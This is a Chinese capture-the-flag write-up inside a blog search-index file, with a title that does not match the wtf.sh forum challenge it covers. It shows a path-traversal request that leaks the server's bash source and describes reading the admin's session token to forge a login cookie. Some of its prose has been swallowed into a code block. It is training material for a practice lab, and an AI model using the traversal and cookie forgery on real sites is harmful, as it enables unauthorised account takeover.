<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[CTF攻防世界-WEB--ics-07]]></title>
      <url>/2020/01/04/ctf-web-ics-07/</url>
      <content type="html"><![CDATA[<div class="note info"><p>0x01 前要与心得</p></div>
1.路径穿越
2.代码审计

<a id="more"></a>

</br>

<div class="note info"><p>0x02 解题流程与思路</p></div>
1.打开网页，注册登录账号，随便看看源码，似乎也没什么破绽。看了看WP，应该是路径穿越漏洞。

<p><img src="1.PNG" alt=""></p>
</br>
2.尝试路径穿越，构造代码：
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post.wtf?post=../</span><br></pre></td></tr></table></figure></div>
</br>
3.出现源码泄露，尝试看看有没有flag找到代码，找到flag进行正规化。
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">source</span> user_functions.sh &lt;html&gt; &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;/head&gt; $ <span class="keyword">if</span> contains <span class="string">'user'</span> <span class="variable">$&#123;!URL_PARAMS[@]&#125;</span> &amp;&amp; file_exists <span class="string">"users/<span class="variable">$&#123;URL_PARAMS['user']&#125;</span>"</span> $ <span class="keyword">then</span> $ <span class="built_in">local</span> username=$(head -n 1 users/<span class="variable">$&#123;URL_PARAMS['user']&#125;</span>); $ <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;<span class="variable">$&#123;username&#125;</span>'s posts:&lt;/h3&gt;"</span>; $ <span class="built_in">echo</span> <span class="string">"&lt;ol&gt;"</span>; $ get_users_posts <span class="string">"<span class="variable">$&#123;username&#125;</span>"</span> | <span class="keyword">while</span> <span class="built_in">read</span> -r post; <span class="keyword">do</span> $ post_slug=$(awk -F/ <span class="string">'&#123;print $2 "#" $3&#125;'</span> &lt;&lt;&lt; <span class="string">"<span class="variable">$&#123;post&#125;</span>"</span>); $ <span class="built_in">echo</span> <span class="string">"&lt;li&gt;&lt;a href=\"/post.wtf?post=<span class="variable">$&#123;post_slug&#125;</span>\"&gt;<span class="variable">$(nth_line 2 "$&#123;post&#125;" | htmlentities)</span>&lt;/a&gt;&lt;/li&gt;"</span>; $ <span class="keyword">done</span> $ <span class="built_in">echo</span> <span class="string">"&lt;/ol&gt;"</span>; $ <span class="keyword">if</span> is_logged_in &amp;&amp; [[ <span class="string">"<span class="variable">$&#123;COOKIES['USERNAME']&#125;</span>"</span> = <span class="string">'admin'</span> ]] &amp;&amp; [[ <span class="variable">$&#123;username&#125;</span> = <span class="string">'admin'</span> ]] $ <span class="keyword">then</span> $ get_flag1 $ <span class="keyword">fi</span> $ <span class="keyword">fi</span> &lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">source</span> user_functions.sh </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">$ <span class="keyword">if</span> contains <span class="string">'user'</span> <span class="variable">$&#123;!URL_PARAMS[@]&#125;</span> &amp;&amp; file_exists <span class="string">"users/<span class="variable">$&#123;URL_PARAMS['user']&#125;</span>"</span> </span><br><span class="line">$ <span class="keyword">then</span> </span><br><span class="line">$ <span class="built_in">local</span> username=$(head -n 1 users/<span class="variable">$&#123;URL_PARAMS['user']&#125;</span>); </span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;<span class="variable">$&#123;username&#125;</span>'s posts:&lt;/h3&gt;"</span>;</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"&lt;ol&gt;"</span>; </span><br><span class="line">$ get_users_posts <span class="string">"<span class="variable">$&#123;username&#125;</span>"</span> | <span class="keyword">while</span> <span class="built_in">read</span> -r post; <span class="keyword">do</span> </span><br><span class="line">$	post_slug=$(awk -F/ <span class="string">'&#123;print $2 "#" $3&#125;'</span> &lt;&lt;&lt; <span class="string">"<span class="variable">$&#123;post&#125;</span>"</span>); </span><br><span class="line">$	<span class="built_in">echo</span> <span class="string">"&lt;li&gt;&lt;a href=\"/post.wtf?post=<span class="variable">$&#123;post_slug&#125;</span>\"&gt;<span class="variable">$(nth_line 2 "$&#123;post&#125;" | htmlentities)</span>&lt;/a&gt;&lt;/li&gt;"</span>;</span><br><span class="line">$ <span class="keyword">done</span> </span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">"&lt;/ol&gt;"</span>; </span><br><span class="line"><span class="keyword">if</span> is_logged_in &amp;&amp; [[ <span class="string">"<span class="variable">$&#123;COOKIES['USERNAME']&#125;</span>"</span> = <span class="string">'admin'</span> ]] &amp;&amp; [[ <span class="variable">$&#123;username&#125;</span> = <span class="string">'admin'</span> ]] </span><br><span class="line">$ <span class="keyword">then</span> </span><br><span class="line">$	get_flag1 </span><br><span class="line">$ <span class="keyword">fi</span> </span><br><span class="line">$ <span class="keyword">fi</span> </span><br><span class="line">&lt;/html&gt;</span><br><span class="line">```bash</span><br><span class="line"></span><br><span class="line">3_1.大略可知当COOKIES[<span class="string">'USERNAME'</span>]&#125;<span class="string">" = 'admin' ]] &amp;&amp; [[ <span class="variable">$&#123;username&#125;</span> = 'admin'时，可以获得flag1,并且存在../users/这个路径可以尝试穿越</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;/br&gt;</span></span><br><span class="line"><span class="string">4.</span></span><br><span class="line"><span class="string">&lt;/br&gt;</span></span><br><span class="line"><span class="string">4.进入users子目录，正好找到里面有admin账号的信息，第一行为cookie，第二行是TOKEN</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">![](2.PNG)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4_1.抓包，利用Burp Suite伪造请求：   可以获得flag1</span></span><br><span class="line"><span class="string">![](3.PNG)</span></span><br><span class="line"><span class="string">![](4.PNG)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">5.继续寻找flag2，可是说是毫无线索了，查看WP，知道是wtf控制服务器，reply存在上传漏洞</span></span><br><span class="line"><span class="string">5_1.不过还是闲着无聊，看看其他代码都在干嘛</span></span><br><span class="line"><span class="string">(1)大体是控制用户登出</span></span><br><span class="line"><span class="string">```bash</span></span><br><span class="line"><span class="string">&lt;html&gt; $ source user_functions.sh &lt;head&gt; &lt;link rel="</span>stylesheet<span class="string">" type="</span>text/css<span class="string">" href="</span>/css/std.css<span class="string">" &gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Welcome to the wtf.sh Forums!&lt;/h1&gt; $ if is_logged_in $ then $ echo "</span>&lt;p&gt;Hi, <span class="variable">$&#123;COOKIES['USERNAME']&#125;</span>. &lt;a href=<span class="string">'/logout.wtf'</span>&gt;Logout&lt;/a&gt; &lt;a href=<span class="string">'/profile.wtf?user=$(basename $(find_user_file $&#123;COOKIES['</span>USERNAME<span class="string">']&#125;))'</span>&gt;Profile&lt;/a&gt;&lt;/p&gt;<span class="string">" $ echo "</span>&lt;a href=/new_post.wtf&gt;New Post&lt;/a&gt;<span class="string">"; $ else $ echo "</span>&lt;p&gt;You<span class="string">'re not logged in. &lt;a href='</span>/login.wtf<span class="string">'&gt;Login&lt;/a&gt; &lt;a href='</span>/new_user.wtf<span class="string">'&gt;Register&lt;/a&gt;&lt;/p&gt;" $ fi &lt;h3&gt;Posts:&lt;/h3&gt; &lt;ol&gt; $ if [[ -e .index_cache.html ]] $ then $ cat .index_cache.html; $ else $ for post_file in posts/*; do $ post_file=$(basename $post_file); $ post_title=$(nth_line 2 &lt; posts/$post_file | htmlentities); $ post_user=$(nth_line 1 &lt; posts/$post_file | htmlentities); $ echo "&lt;li&gt;&lt;a href=\"/post.wtf?post=$post_file\"&gt;$post_title&lt;/a&gt; by $&#123;post_user&#125;&lt;/li&gt;"; $ done; $ fi &lt;/ol&gt; &lt;/body&gt; &lt;/html&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>(2)比对功能，寻找合适的命令</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Some useful standard functions to have around :) # check if an array contains a given value # contains "asdf" "asdf an array of values" =&gt; has exit code 0 function contains &#123; local e; for e in "$&#123;@:2&#125;"; do [[ "$e" == "$1" ]] &amp;&amp; return 0; done; return 1; &#125; function file_exists &#123; local file=$1; stat $&#123;file&#125; &gt; /dev/null; &#125; function nth_line &#123; local n=$1; local filename; if [[ $# != 1 ]] then filename=$2; sed "$&#123;n&#125;q;d" &lt; $filename; else sed "$&#123;n&#125;q;d" fi 2&gt; /dev/null &#125; function redirect &#123; local target="$1"; echo "&lt;script&gt;window.location.href='$&#123;target&#125;';&lt;/script&gt;"; &#125; # Hacky way of figuring out which date command is appropriate, # depending if we're on BSD or GNU coreutils YESTERDAY_CMD=""; TOMORROW_CMD=""; if date --help | grep "GNU" &gt; /dev/null then # Using GNU date TOMORROW_CMD="date -d tomorrow"; YESTERDAY_CMD="date -d yesterday"; else # Using BSD date TOMORROW_CMD="date -v +1d"; YESTERDAY_CMD="date -v -1d"; fi function set_cookie &#123; local key="$1"; local value="$2"; local expiry=$($&#123;TOMORROW_CMD&#125;); echo "&lt;script&gt;document.cookie = '$&#123;key&#125;=$&#123;value&#125;; expires=$&#123;expiry&#125;; path=/';&lt;/script&gt;"; COOKIES[$key]="$&#123;value&#125;"; &#125; function get_cookie &#123; echo "$&#123;COOKIES[$1]&#125;"; &#125; function remove_cookie &#123; local key="$1"; local expiry=$($&#123;YESTERDAY_CMD&#125;); # expiration dates in the past delete cookies echo "&lt;script&gt;document.cookie = '$&#123;key&#125;=riperino; expires=$&#123;expiry&#125;; path=/';&lt;/script&gt;"; unset COOKIES[$key]; &#125; # take text on input, transform any html special chars to the corresponding entities function htmlentities &#123; sed "s/\&amp;/\&amp;amp;/g" | sed "s/&lt;/\&amp;lt;/g" | sed "s/&gt;/\&amp;gt;/g"; &#125;</span></span><br></pre></td></tr></table></figure></div>
<p>(3)对比本地密码，这是最开始玩家创建账号时候，登陆账号时候进行验证</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;/head&gt; $ <span class="built_in">source</span> user_functions.sh $ <span class="keyword">if</span> [[ <span class="variable">$method</span> = <span class="string">'POST'</span> ]] $ <span class="keyword">then</span> $ <span class="built_in">local</span> username=<span class="variable">$&#123;POST_PARAMS['username']&#125;</span>; $ <span class="built_in">local</span> password=<span class="variable">$&#123;POST_PARAMS['password']&#125;</span>; $ <span class="built_in">local</span> userfile=$(find_user_file <span class="variable">$&#123;username&#125;</span>); $ <span class="keyword">if</span> [[ <span class="variable">$&#123;userfile&#125;</span> != <span class="string">'NONE'</span> ]] $ <span class="keyword">then</span> $ <span class="comment"># User exists, try to login $ if $(check_password $&#123;username&#125; $&#123;password&#125;) $ then $ # correct pass $ set_cookie "USERNAME" $&#123;username&#125;; $ set_cookie "TOKEN" $(nth_line 3 $&#123;userfile&#125;); $ redirect "/"; $ else $ # incorrect pass $ echo "&lt;h3&gt;Sorry, wrong password for user $&#123;username&#125;:(&lt;br&gt;Try again?&lt;/h3&gt;"; $ fi $ else $ # user doesn't exist $ echo "&lt;h3&gt;Sorry, user $&#123;username&#125; doesn't exist :(&lt;br&gt;Try again?&lt;/h3&gt;" $ fi $ fi &lt;h3&gt;Login&lt;/h3&gt; &lt;form method=POST&gt; &lt;input type=text name=username placeholder="username"&gt;&lt;/input&gt;&lt;br&gt; &lt;input type=password name=password placeholder="password"&gt;&lt;/input&gt;&lt;br&gt; &lt;button type=submit name=submit&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;/html&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>(4)注销账号</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;/head&gt; $ <span class="built_in">source</span> user_functions.sh $ <span class="keyword">if</span> is_logged_in $ <span class="keyword">then</span> $ remove_cookie <span class="string">'USERNAME'</span>; $ remove_cookie <span class="string">'TOKEN'</span>; $ redirect <span class="string">"/"</span>; $ <span class="keyword">else</span> $ <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;You need to be logged in to log out, bud.&lt;/h3&gt;"</span>; $ <span class="keyword">fi</span> &lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
<p>(5)感觉是对一开始登陆评论时候的控制</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;/head&gt; $ <span class="built_in">source</span> user_functions.sh $ <span class="built_in">source</span> post_functions.sh $ <span class="keyword">if</span> [[ <span class="variable">$method</span> = <span class="string">'POST'</span> ]] $ <span class="keyword">then</span> $ <span class="keyword">if</span> is_logged_in $ <span class="keyword">then</span> $ post_id=$(create_post <span class="string">"<span class="variable">$&#123;COOKIES['USERNAME']&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;POST_PARAMS['title']&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;POST_PARAMS['text']&#125;</span>"</span>); $ redirect <span class="string">"/post.wtf?post=<span class="variable">$&#123;post_id&#125;</span>"</span>; $ <span class="keyword">else</span> $ <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;pls login 2 be posting&lt;/h3&gt;"</span>; $ <span class="keyword">fi</span> $ <span class="keyword">fi</span> &lt;form method=POST&gt; &lt;input <span class="built_in">type</span>=text name=title placeholder=<span class="string">"Post Title"</span>&gt;&lt;/input&gt;&lt;br&gt; &lt;textarea name=text placeholder=<span class="string">"Post Text"</span>&gt;&lt;/textarea&gt;&lt;br&gt; &lt;button <span class="built_in">type</span>=submit name=submit&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
<p>(6)注册账号</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;/head&gt; $ <span class="built_in">source</span> user_functions.sh $ <span class="keyword">if</span> [[ <span class="variable">$method</span> = <span class="string">'POST'</span> ]] $ <span class="keyword">then</span> $ <span class="built_in">local</span> username=<span class="variable">$&#123;POST_PARAMS['username']&#125;</span>; $ <span class="built_in">local</span> password=<span class="variable">$&#123;POST_PARAMS['password']&#125;</span>; $ <span class="keyword">if</span> [[ $(find_user_file <span class="string">"<span class="variable">$&#123;username&#125;</span>"</span>) = <span class="string">'NONE'</span> ]] $ <span class="keyword">then</span> $ <span class="comment"># create user $ echo "ok, gonna go make that user... $&#123;username&#125;"; $ local user_id=$(create_user "$&#123;username&#125;" "$&#123;password&#125;"); $ redirect "/login.wtf"; $ else $ # user already exists $ echo "&lt;h3&gt;Sorry, user $&#123;username&#125; already exists :(&lt;br&gt;Try again?&lt;/h3&gt;" $ fi $ fi &lt;h3&gt;Register&lt;/h3&gt; &lt;form method=POST&gt; &lt;input type=text name=username placeholder="username"&gt;&lt;/input&gt;&lt;br&gt; &lt;input type=password name=password placeholder="password"&gt;&lt;/input&gt;&lt;br&gt; &lt;button type=submit name=submit&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;/html&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>(7)帖子查询控制</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/post.css"</span> &gt; &lt;/head&gt; &lt;body&gt; $ <span class="built_in">source</span> user_functions.sh $ <span class="keyword">if</span> contains <span class="string">'post'</span> <span class="variable">$&#123;!URL_PARAMS[@]&#125;</span> &amp;&amp; file_exists <span class="string">"posts/<span class="variable">$&#123;URL_PARAMS['post']&#125;</span>"</span> $ <span class="keyword">then</span> $ post_id=<span class="variable">$&#123;URL_PARAMS['post']&#125;</span>; $ <span class="keyword">for</span> post_file <span class="keyword">in</span> $(ls posts/<span class="variable">$&#123;post_id&#125;</span>/* | sort --field-separator=<span class="string">'/'</span> --key=3 -n); <span class="keyword">do</span> $ <span class="built_in">echo</span> <span class="string">"&lt;div class=\"post\"&gt;"</span>; $ poster=$(nth_line 1 <span class="variable">$&#123;post_file&#125;</span> | htmlentities); $ title=$(nth_line 2 <span class="variable">$&#123;post_file&#125;</span> | htmlentities); $ body=$(tail -n +3 <span class="variable">$&#123;post_file&#125;</span> | htmlentities 2&gt; /dev/null); $ <span class="built_in">echo</span> <span class="string">"&lt;span class=\"post-poster\"&gt;Posted by &lt;a href=\"/profile.wtf?user=<span class="variable">$(basename $(find_user_file "$&#123;poster&#125;")</span>)\"&gt;<span class="variable">$&#123;poster&#125;</span>&lt;/a&gt;&lt;/span&gt;"</span>; $ <span class="built_in">echo</span> <span class="string">"&lt;span class=\"post-title\"&gt;<span class="variable">$title</span>&lt;/span&gt;"</span>; $ <span class="built_in">echo</span> <span class="string">"&lt;span class=\"post-body\"&gt;<span class="variable">$body</span>&lt;/span&gt;"</span>; $ <span class="built_in">echo</span> <span class="string">"&lt;/div&gt;"</span>; $ <span class="keyword">done</span> $ <span class="keyword">else</span> $ <span class="built_in">echo</span> <span class="string">"Pls give a (valid) post id"</span>; $ <span class="keyword">fi</span>; &lt;div class=<span class="string">"action-btns"</span>&gt; $ <span class="built_in">echo</span> <span class="string">"&lt;a href=\"/reply.wtf?post=<span class="variable">$&#123;post_id&#125;</span>\"&gt;Reply&lt;/a&gt;"</span> &lt;a href=<span class="string">"/"</span>&gt;Back&lt;/a&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
<p>(8)创建一个新的帖子，并且管理用户id，这里我们在后面会用到reply功能</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> user_functions.sh <span class="comment"># Create a new post. Returns the post id. function create_post &#123; local username=$1; local title=$2; local text=$3; local hashed=$(hash_username "$&#123;username&#125;"); # ensure posts dir exists and isn't listable. mkdir posts 2&gt; /dev/null; touch posts/.nolist; # don't allow directory listing on posts touch posts/.noread; # don't allow file reads on post local post_id=$(basename $(mktemp --directory posts/XXXXX)); echo $&#123;username&#125; &gt; "posts/$&#123;post_id&#125;/1"; echo $&#123;title&#125; &gt;&gt; "posts/$&#123;post_id&#125;/1"; echo $&#123;text&#125; &gt;&gt; "posts/$&#123;post_id&#125;/1"; touch "posts/$&#123;post_id&#125;/.nolist"; touch "posts/$&#123;post_id&#125;/.noread"; # add to our cache for the homepage echo "&lt;li&gt;&lt;a href=\"/post.wtf?post=$&#123;post_id&#125;\"&gt;$(htmlentities &lt;&lt;&lt; $&#123;title&#125;)&lt;/a&gt; by $(htmlentities &lt;&lt;&lt; $&#123;username&#125;)&lt;/li&gt;" &gt;&gt; .index_cache.html # add post to users' post cache local hashed=$(hash_username "$&#123;username&#125;"); echo "$&#123;post_id&#125;/1" &gt;&gt; "users_lookup/$&#123;hashed&#125;/posts"; echo $&#123;post_id&#125;; &#125; function reply &#123; local post_id=$1; local username=$2; local text=$3; local hashed=$(hash_username "$&#123;username&#125;"); curr_id=$(for d in posts/$&#123;post_id&#125;/*; do basename $d; done | sort -n | tail -n 1); next_reply_id=$(awk '&#123;print $1+1&#125;' &lt;&lt;&lt; "$&#123;curr_id&#125;"); next_file=(posts/$&#123;post_id&#125;/$&#123;next_reply_id&#125;); echo "$&#123;username&#125;" &gt; "$&#123;next_file&#125;"; echo "RE: $(nth_line 2 &lt; "posts/$&#123;post_id&#125;/1")" &gt;&gt; "$&#123;next_file&#125;"; echo "$&#123;text&#125;" &gt;&gt; "$&#123;next_file&#125;"; # add post this is in reply to to posts cache echo "$&#123;post_id&#125;/$&#123;next_reply_id&#125;" &gt;&gt; "users_lookup/$&#123;hashed&#125;/posts"; &#125;</span></span><br></pre></td></tr></table></figure></div>
<p>(9)这是flag1的线索</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">source</span> user_functions.sh &lt;html&gt; &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;/head&gt; $ <span class="keyword">if</span> contains <span class="string">'user'</span> <span class="variable">$&#123;!URL_PARAMS[@]&#125;</span> &amp;&amp; file_exists <span class="string">"users/<span class="variable">$&#123;URL_PARAMS['user']&#125;</span>"</span> $ <span class="keyword">then</span> $ <span class="built_in">local</span> username=$(head -n 1 users/<span class="variable">$&#123;URL_PARAMS['user']&#125;</span>); $ <span class="built_in">echo</span> <span class="string">"&lt;h3&gt;<span class="variable">$&#123;username&#125;</span>'s posts:&lt;/h3&gt;"</span>; $ <span class="built_in">echo</span> <span class="string">"&lt;ol&gt;"</span>; $ get_users_posts <span class="string">"<span class="variable">$&#123;username&#125;</span>"</span> | <span class="keyword">while</span> <span class="built_in">read</span> -r post; <span class="keyword">do</span> $ post_slug=$(awk -F/ <span class="string">'&#123;print $2 "#" $3&#125;'</span> &lt;&lt;&lt; <span class="string">"<span class="variable">$&#123;post&#125;</span>"</span>); $ <span class="built_in">echo</span> <span class="string">"&lt;li&gt;&lt;a href=\"/post.wtf?post=<span class="variable">$&#123;post_slug&#125;</span>\"&gt;<span class="variable">$(nth_line 2 "$&#123;post&#125;" | htmlentities)</span>&lt;/a&gt;&lt;/li&gt;"</span>; $ <span class="keyword">done</span> $ <span class="built_in">echo</span> <span class="string">"&lt;/ol&gt;"</span>; $ <span class="keyword">if</span> is_logged_in &amp;&amp; [[ <span class="string">"<span class="variable">$&#123;COOKIES['USERNAME']&#125;</span>"</span> = <span class="string">'admin'</span> ]] &amp;&amp; [[ <span class="variable">$&#123;username&#125;</span> = <span class="string">'admin'</span> ]] $ <span class="keyword">then</span> $ get_flag1 $ <span class="keyword">fi</span> $ <span class="keyword">fi</span> &lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
<p>(10)好像是创建帖子</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; &lt;head&gt; &lt;link rel=<span class="string">"stylesheet"</span> <span class="built_in">type</span>=<span class="string">"text/css"</span> href=<span class="string">"/css/std.css"</span> &gt; &lt;/head&gt; $ <span class="built_in">source</span> user_functions.sh $ <span class="built_in">source</span> post_functions.sh $ <span class="keyword">if</span> [[ <span class="variable">$method</span> = <span class="string">'POST'</span> ]] $ <span class="keyword">then</span> $ <span class="keyword">if</span> is_logged_in $ <span class="keyword">then</span> $ <span class="keyword">if</span> [[ <span class="variable">$&#123;POST_PARAMS['text']&#125;</span> != <span class="string">''</span> &amp;&amp; <span class="variable">$&#123;URL_PARAMS['post']&#125;</span> != <span class="string">''</span> ]] $ <span class="keyword">then</span> $ reply <span class="string">"<span class="variable">$&#123;URL_PARAMS['post']&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;COOKIES['USERNAME']&#125;</span>"</span> <span class="string">"<span class="variable">$&#123;POST_PARAMS['text']&#125;</span>"</span> $ redirect <span class="string">"/post.wtf?post=<span class="variable">$&#123;URL_PARAMS['post']&#125;</span>#<span class="variable">$&#123;next_post_id&#125;</span>"</span>; $ <span class="keyword">else</span> $ redirect <span class="string">"/reply.wtf?post=<span class="variable">$&#123;URL_PARAMS['post']&#125;</span>"</span>; $ <span class="keyword">fi</span> $ <span class="keyword">else</span> $ redirect <span class="string">"/login.wtf"</span> $ <span class="keyword">fi</span> $ <span class="keyword">fi</span> $ <span class="keyword">if</span> [[ <span class="variable">$&#123;URL_PARAMS['post']&#125;</span> = <span class="string">''</span> ]] $ <span class="keyword">then</span> $ <span class="built_in">echo</span> <span class="string">"u need to be replying to a post, you dumdum"</span>; $ <span class="keyword">fi</span> $ <span class="keyword">if</span> is_logged_in $ <span class="keyword">then</span> $ <span class="built_in">echo</span> <span class="string">"u r logged in, s0 gib reply"</span> $ <span class="keyword">else</span> $ redirect <span class="string">"/login.wtf"</span> $ <span class="keyword">fi</span> &lt;form method=POST&gt; &lt;textarea name=text placeholder=<span class="string">"Reply Text"</span>&gt;&lt;/textarea&gt;&lt;br&gt; &lt;button <span class="built_in">type</span>=submit name=submit&gt;Submit&lt;/button&gt; &lt;/form&gt; &lt;/html&gt;</span><br></pre></td></tr></table></figure></div>
<p>(11)控制权限</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -R /opt/wtf.sh /tmp/wtf_runtime; <span class="comment"># protect our stuff chmod -R 555 /tmp/wtf_runtime/wtf.sh/*.wtf; chmod -R 555 /tmp/wtf_runtime/wtf.sh/*.sh; chmod 777 /tmp/wtf_runtime/wtf.sh/; # set all dirs we could want to write into to be owned by www # (We don't do whole webroot since we want the people to be able to create # files in webroot, but not overwrite existing files) chmod -R 777 /tmp/wtf_runtime/wtf.sh/posts/; chown -R www:www /tmp/wtf_runtime/wtf.sh/posts/; chmod -R 777 /tmp/wtf_runtime/wtf.sh/users/; chown -R www:www /tmp/wtf_runtime/wtf.sh/users/; chmod -R 777 /tmp/wtf_runtime/wtf.sh/users_lookup/; chown -R www:www /tmp/wtf_runtime/wtf.sh/users_lookup/; # let's get this party started! su www -c "/tmp/wtf_runtime/wtf.sh/wtf.sh 8000";</span></span><br></pre></td></tr></table></figure></div>

<p>(12)这里应该是对 用户名之类的进行了加密处理</p>
